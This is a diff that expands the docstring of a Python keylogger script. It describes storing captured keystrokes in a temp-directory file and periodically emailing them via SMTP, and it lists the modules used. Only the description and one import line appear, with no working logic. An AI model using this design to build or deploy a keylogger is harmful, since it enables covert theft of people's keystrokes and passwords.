@@ -1,10 +1,19 @@
 #!user/bin/env
 
-r""" This script is key logger which accepts 4 inputs -
+r""" This script is a key logger. It stores the key strokes in a file('zlog.txt) in the temp directory of the system and after regular intervals mail them to the user.
+     The server used to send mails are smtp.
+     This script accepts 4 inputs -
     * File writing interval : It is the time interval after which the key strokes are saved in the file.
     * Mail sending interval : It is the time interval after which a mail is sent to the given username.
     * Username              : It is the mail id to which the mail is sent.
     * Password              : It is the password of that mailing id.
+
+    The modules imported in the script are >>>
+    * pynput.keyboard : Pynput is a module which used for capturing devices like mouse clicks, keyboard strokes,etc.
+    * threading       : Threading module is used to make the program multithreaded.
+    * smtplib         : smtp (Simple Mail Tranfer Protocol) are used to send mails
+    * os              : os module is used to change directory , remove files or os related jobs
+    * tempfile        : tempfile module is used to get the path of temp directory
 """
 
 import pynput.keyboard
